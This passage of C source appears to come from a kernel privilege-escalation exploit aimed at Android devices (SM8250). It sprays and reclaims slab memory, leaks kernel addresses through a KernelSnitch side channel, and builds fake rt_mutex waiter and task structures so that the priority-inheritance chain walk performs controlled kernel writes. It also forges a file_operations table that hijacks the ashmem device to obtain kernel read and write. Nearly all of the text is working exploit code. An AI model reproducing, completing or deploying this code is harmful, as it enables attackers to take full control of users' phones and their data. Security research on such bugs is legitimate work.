  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
             getpid(), BUILD_VARIANT_LABEL);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER,
             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void log_slide_child_context(void) {
  char attr[256];
  char enforce[32];
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
             "egid=%u attr=%s enforce=%s\n",
             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
             attr, enforce);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_OTHER;
  attr.sched_nice = nice_value;
  int ret = (int)syscall(SYS_sched_setattr, tid, &attr, 0);
  int saved = errno;
  if (ret == 0) return 0;
  pr_warning("sched_setattr tid=%d nice=%d ret=%d errno=%d; "
             "falling back to setpriority\n", tid, nice_value, ret, saved);
  /* Fallback: setpriority(PRIO_PROCESS, tid, nice) is simpler and
   * triggers the same PI chain walk via __sched_setscheduler. */
  errno = 0;
  ret = setpriority(PRIO_PROCESS, tid, nice_value);
  if (ret != 0) {
    pr_warning("setpriority tid=%d nice=%d ret=%d errno=%d\n",
               tid, nice_value, ret, errno);
  }
  return ret;
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

int has_zero_byte(uintptr_t value) {
  for (int i = 0; i < 8; i++) {
    if (((value >> (i * 8)) & 0xff) == 0) {
      return 1;
    }
  }
  return 0;
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_addr(uintptr_t image_addr) {
  /* Linear-map randomization: memstart_addr shifts every phys→VA
   * translation by a constant.  We can't read memstart_addr, but we can
   * compute the delta from the KernelSnitch mm address: the kernel data
   * (fops) and the mm struct are both in the same contiguous linear map,
   * so data_va = mm_va - (mm_phys - data_phys).  We approximate by
   * subtracting a tunable delta from the unslid alias. */
  return p0_data_alias(image_addr) - g_linear_map_delta;
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

/* Read back SKB data from the reclaim socket after the PI chain walk.
 * The kernel may have modified the SKB data at page_base (rb ops,
 * waiter->prio = task->prio copy).  recvmsg lets us see the kernel's
 * copy, giving us a read primitive for the controlled page. */
uint32_t ks_leak_readback(void) {
  if (reclaim_sv[1] < 0 || !skb_buf) {
    pr_warning("KS_LEAK no socket or buf sv=%d buf=%p\n",
               reclaim_sv[1], (void *)skb_buf);
    return 0;
  }

  static unsigned char rbuf[SKB_SEND_SIZE];
  struct iovec iov = { rbuf, SKB_SEND_SIZE };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  size_t prio_off = (size_t)W0_OFF + 0x40;
  size_t lock_off = (size_t)LOCK_OFF;
  uint32_t orig = FAKE_WAITER_PRIO;
  uint32_t leak = 0;
  ks_leak_walk_touched = 0;

  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    ssize_t n = recvmsg(reclaim_sv[1], &msg, MSG_DONTWAIT);
    if (n <= 0) {
      pr_info("KS_LEAK recv %d n=%zd errno=%d\n", i, n, errno);
      break;
    }
    size_t check = (size_t)n < SKB_SEND_SIZE ? (size_t)n : SKB_SEND_SIZE;
    if (prio_off + 4 > check) continue;

    uint32_t got;
    memcpy(&got, rbuf + prio_off, 4);
    uint32_t wait_lock;
    memcpy(&wait_lock, rbuf + lock_off, 4);
    pr_info("KS_LEAK skb[%d] wait_lock=0x%08x prio=0x%08x orig=0x%08x %s\n",
            i, wait_lock, got, orig, got != orig ? "LEAK!" : "same");
    if (wait_lock != 0) {
      pr_success("KS_LEAK wait_lock MODIFIED: chain walk trylocked "
                 "our fake_lock! pi_blocked_on was non-NULL!\n");
    }
    if (wait_lock != 0 || got != orig) {
      ks_leak_walk_touched = 1;
    }
    pr_info("KS_LEAK skb[%d] prio_off=0x%zx val=0x%08x orig=0x%08x %s\n",
            i, prio_off, got, orig, got != orig ? "LEAK!" : "same");
    if (got != orig) {
      leak = got;
      break;
    }
  }
  return leak;
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

/* H1A-only diagnostic: dump every qword that differs from the payload we
 * sent into the reclaim socket.  This gives a direct answer to whether the
 * PI chain wrote anywhere inside the controlled page, rather than relying
 * on the two hand-picked fields checked by ks_leak_readback(). */
void ks_leak_diff_dump(void) {
  if (reclaim_sv[1] < 0 || !skb_buf) {
    pr_warning("KS_DIFF no socket or buf sv=%d buf=%p\n",
               reclaim_sv[1], (void *)skb_buf);
    return;
  }

  static unsigned char rbuf[SKB_SEND_SIZE];
  struct iovec iov = { rbuf, SKB_SEND_SIZE };
  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    ssize_t n = recvmsg(reclaim_sv[1], &msg, MSG_DONTWAIT);
    if (n <= 0) {
      pr_info("KS_DIFF recv %d n=%zd errno=%d\n", i, n, errno);
      break;
    }
    size_t check = (size_t)n < SKB_SEND_SIZE ? (size_t)n : SKB_SEND_SIZE;
    size_t diff_count = 0;
    for (size_t off = 0; off + sizeof(uint64_t) <= check; off += sizeof(uint64_t)) {
      uint64_t old;
      uint64_t got;
      memcpy(&old, skb_buf + off, sizeof(old));
      memcpy(&got, rbuf + off, sizeof(got));
      if (old == got) continue;
      if (diff_count < 16) {
        pr_info("KS_DIFF skb=%d off=0x%zx old=%016llx new=%016llx\n",
                i, off, (unsigned long long)old,
                (unsigned long long)got);
      }
      diff_count++;
    }
    pr_info("KS_DIFF skb=%d bytes=%zu diffs=%zu\n", i, check, diff_count);
  }
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
#ifdef KS_BUILD_S3
  put64(p, off + FOPS_LLSEEK_OFF, fake_w0 + 0x18);
#else
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
#endif
#ifdef CFGOPS_4_19_STYLE
  /* 4.19: pread/pwrite call f_op->read/write directly; configfs_read_file /
   * configfs_write_bin_file have exactly those signatures on 4.19 */
  put64(p, off + FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(p, off + FOPS_READ_ITER_OFF, 0);
  put64(p, off + FOPS_WRITE_ITER_OFF, 0);
#else
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
#endif
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  /* run collision finding in the MAIN process so the target mm is the
   * parent's live mm_struct (not a fork child whose mm is freed on exit) */
  kernelsnitch_find_collisions(ks);
  return getpid();
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

void prepare_ctxs(void) {
  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
  prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
  prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);

  spray_ctx.mm_cnt = (1 + MM_PARTIALS) * mm_objs_per_slab;
  spray_ctx.childs = calloc(sizeof(pid_t), spray_ctx.mm_cnt);
  spray_ctx.memfds = calloc(sizeof(int), spray_ctx.mm_cnt);

  pre_ctx.mm_cnt = mm_objs_per_slab - 1;
  pre_ctx.childs = calloc(sizeof(pid_t), pre_ctx.mm_cnt);
  pre_ctx.memfds = calloc(sizeof(int), pre_ctx.mm_cnt);

  post_ctx.mm_cnt = mm_objs_per_slab;
  post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
  post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
}

int prepare_skb_payload(uintptr_t base, int payload_mode) {
  memset(skb_buf, 0, SKB_SEND_SIZE);

  uintptr_t payload_base = base + SKB_DATA_DELTA;
  size_t s2_used_end = (size_t)SKB_FRAG_BIAS +
                       FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF + 8;
  if (payload_mode == PAGE_PAYLOAD_S2 &&
      (s2_used_end > SKB_SEND_SIZE ||
       (size_t)SKB_FRAG_BIAS + W0_OFF + 0x58 + 8 > SKB_SEND_SIZE)) {
    pr_error("S2 payload prefix exceeds controlled skb size end=%zu\n",
             s2_used_end);
    return 0;
  }

  fake_lock = payload_base + LOCK_OFF;
  fake_w0 = payload_base + W0_OFF;
  fake_task = payload_base + FAKE_TASK_OFF;
  fake_fops = payload_base + FOPS_TABLE_OFF;
  if (payload_mode == PAGE_PAYLOAD_FOPS) {
    fake_parent = fake_fops;
    fake_right = data_addr(ASHMEM_MISC_FOPS);
    fake_left = 0;
    binwrite_target = payload_base + SCRATCH_OFF;
  } else {
    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
    fake_right = fake_fops;
    fake_left = payload_base + LEFT_OFF;
    binwrite_target = payload_base + FOPS_OFF + 0x700;
  }

  uintptr_t write_pc = fake_fops;
  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
  uintptr_t write_left = 0;
  uint64_t waiter_task = text_addr(INIT_TASK);
  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
  uint64_t pi_top_task = text_addr(INIT_TASK);
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    write_pc = SLIDE_LOGGERS_0_1;
    write_right = 0;
    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
  }
  /* FOPS mode now also runs without slide (alioth pselect route is dead),
   * so text_addr(INIT_TASK) would return an uncalibrated vmalloc address.
   * Keep every PI-chain pointer inside the controlled page for both
   * payload modes so a partial route cannot fault or spin on garbage. */
  waiter_task = fake_task;
  task_group = fake_task;
  pi_top_task = fake_task;

  for (size_t chunk = 0;
       chunk + (size_t)SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
       chunk += ORDER3_SIZE) {
    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;

    put32(p, LOCK_OFF + 0x00, 0);
    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
      /* Two-level PI chain within our controlled page:
       * stale_waiter -> fake_lock (trylock OK) -> owner = fake_task
       * -> fake_task->pi_blocked_on = fake_w0 -> fake_w0->lock =
       * fake_lock -> prio mismatch -> adjustment -> fake_w0->prio =
       * fake_task->prio.  We can read the prio change via recvmsg! */
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    } else {
      put64(p, LOCK_OFF + 0x08, fake_w0);
      put64(p, LOCK_OFF + 0x10, fake_w0);
      put64(p, LOCK_OFF + 0x18, fake_task | 1);
    }

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    /* Chain-walk safety: rt_mutex_adjust_prio_chain reads the top waiter
     * of the fake lock via rb_leftmost and then checks
     * top_waiter->lock (real layout offset +0x38) == current lock.
     * In the fake page, +0x38 is also pi_tree_entry.rb_left (write_left).
     * Override it to fake_lock so the sanity check passes and the walk
     * exits cleanly (fake_task->pi_blocked_on = 0). */
    put64(p, W0_OFF + 0x38, fake_lock);

    /* Offset-tolerant safety fill: every qword in the fake task's PI region
     * is a self-referencing empty plist head, so kernel reads at a wrong
     * task_struct offset still yield a valid empty list and all kernel-side
     * writes stay inside this page instead of panicking. Explicit fields
     * below still land at the intended offsets. */
    for (size_t off = FAKE_TASK_OFF + 0x600; off < FAKE_TASK_OFF + 0xb00;
         off += 8) {
      put64(p, off, payload_base + off);
    }
    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    } else {
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
    }
    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, fake_w0);

    put64(p, RIGHT_OFF + 0x00, fake_parent);
    put64(p, RIGHT_OFF + 0x08, 0);
    put64(p, RIGHT_OFF + 0x10, 0);

    put64(p, LEFT_OFF + 0x00, fake_parent);
    put64(p, LEFT_OFF + 0x08, 0);
    put64(p, LEFT_OFF + 0x10, 0);

    if (payload_mode == PAGE_PAYLOAD_FOPS) {
      put_fake_fops_table(p, FOPS_TABLE_OFF);
    }
  }

  if (payload_mode == PAGE_PAYLOAD_S2) {
    /* The sendmsg data is the controlled SKB prefix below shared_info. */
    unsigned char *p = skb_buf + SKB_FRAG_BIAS;

    put64(p, LOCK_OFF + 0x08, fake_w0);
    put64(p, LOCK_OFF + 0x10, fake_w0);
    put64(p, LOCK_OFF + 0x18, fake_task | 1);

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put64(p, W0_OFF + 0x18, 1);
    put64(p, W0_OFF + 0x20, 0);
    put64(p, W0_OFF + 0x28, 0);
    put64(p, W0_OFF + 0x30, fake_task);
    put64(p, W0_OFF + 0x38, fake_lock);
    put32(p, W0_OFF + 0x40, 140);
    put32(p, W0_OFF + 0x44, 0);
    put64(p, W0_OFF + 0x48, 0);
    put64(p, W0_OFF + 0x50, 0);
    put64(p, W0_OFF + 0x58, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put64(p, FAKE_TASK_OFF + 0x420, 0);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
          fake_w0 + 0x18);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, fake_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
#ifdef KS_BUILD_S3
  } else if (payload_mode == PAGE_PAYLOAD_S3) {
    unsigned char *p = skb_buf + SKB_FRAG_BIAS;
    uintptr_t misc_fops = text_addr(ASHMEM_MISC_FOPS);

    /* S3 uses the audited upstream pselect write shape 1.  The PI-tree
     * erase uses misc_fops-8 as the synthetic parent, so rbtree writes
     * fake_fops through parent->rb_right at exactly misc_fops. */
    put64(p, LOCK_OFF + 0x08, fake_w0);
    put64(p, LOCK_OFF + 0x10, fake_w0);
    put64(p, LOCK_OFF + 0x18, fake_task | 1);

    put64(p, W0_OFF + 0x00, 1);
    put64(p, W0_OFF + 0x08, 0);
    put64(p, W0_OFF + 0x10, 0);
    put64(p, W0_OFF + 0x18, misc_fops - 8);
    put64(p, W0_OFF + 0x20, fake_fops);
    put64(p, W0_OFF + 0x28, 0);
    put64(p, W0_OFF + 0x30, fake_task);
    put64(p, W0_OFF + 0x38, fake_lock);
    put32(p, W0_OFF + 0x40, 140);
    put32(p, W0_OFF + 0x44, 0);
    put64(p, W0_OFF + 0x48, 0);
    put64(p, W0_OFF + 0x50, 0);
    put64(p, W0_OFF + 0x58, 0);

    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
    put64(p, FAKE_TASK_OFF + 0x420, 0);
    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, fake_task);
    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);

    put_fake_fops_table(p, FOPS_TABLE_OFF);
  }
#else
  }
#endif
  return 1;
}

uintptr_t prepare_kernel_page(int payload_mode) {
  close_reclaim_sockets();
  /* SLUB object stride, not logical mm_struct size: 0x388 + 8-byte
   * cpumask (CONFIG_NR_CPUS=8) = 0x390 request, HWCACHE_ALIGN to the
   * SM8250 64-byte cache line -> 0x3c0 (see rt-waiter-placement-audit.md). */
  mm_objs_per_slab = ORDER3_SIZE / 0x3c0;
  prepare_ctxs();

  skb_buf = malloc(SKB_SEND_SIZE);
  memset(skb_buf, 0x41, SKB_SEND_SIZE);

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    prepare_ctx.childs[i] = clone_child();
    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
  }

  for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
    spray_ctx.childs[i] = clone_child();
    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
  }

  uintptr_t leaked = 0;
  if (!leaked) {
    int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
    detect_memory();
    ks = kernelsnitch_setup(
        MM_STRUCT_SZ, MM_ORDER, cpu_count, KS_RUN16_COLLISIONS, 1, 0);  /* verbose diagnostics for on-device debug */
    ks->identity_start = (size_t)g_direct_map_base;
    ks->identity_end = (size_t)g_direct_map_end;
    pr_info("KS_MM_SCAN window start=%016zx end=%016zx\n",
            (size_t)ks->identity_start, (size_t)ks->identity_end);
    {
      const char *scan_start = getenv("KS_MM_START");
      const char *scan_end = getenv("KS_MM_END");
      if (scan_start && *scan_start && scan_end && *scan_end) {
        uintptr_t start = (uintptr_t)strtoull(scan_start, NULL, 0);
        uintptr_t end = (uintptr_t)strtoull(scan_end, NULL, 0);
        if (start < end && start >= g_direct_map_base && end <= g_direct_map_end) {
          ks->identity_start = start;
          ks->identity_end = end;
          pr_info("KS_MM_SCAN override start=%016zx end=%016zx\n", start, end);
        }
      }
    }
    ks->ram_bytes = g_ram_bytes;

    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      pre_ctx.childs[i] = clone_child();
    }
    child_leak = clone_leak_child();
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      post_ctx.childs[i] = clone_child();
    }

    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
    }
    memfd_leak = open_memfd(child_leak);
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
    }

    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
      kill_child(pre_ctx.childs[i]);
    }
    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
      kill_child(post_ctx.childs[i]);
    }
    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
      kill_child(spray_ctx.childs[i]);
    }
    /* in-process collision finding: no child to reap */
    if (child_leak != getpid())
      SYSCHK(waitpid(child_leak, NULL, 0));

    if (!kernelsnitch_found_collisions(ks)) {
      pr_warning("KernelSnitch collision finding failed\n");
      ks->state = KERNELSNITCH_MM_NOT_FOUND;
      kernel_page_collision_fail_fast = 1;
      kernelsnitch_cleanup(ks);
      ks = NULL;
      for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
        kill_child(prepare_ctx.childs[i]);
      }
      cleanup_page_prepare_state();
      return 0;
    }

    uintptr_t answer_mm = bucket_answer_pending_mm();
    if (!answer_mm) {
      pr_warning("BUCKET_ANSWER pending mm missing\n");
      kernel_page_collision_fail_fast = 1;
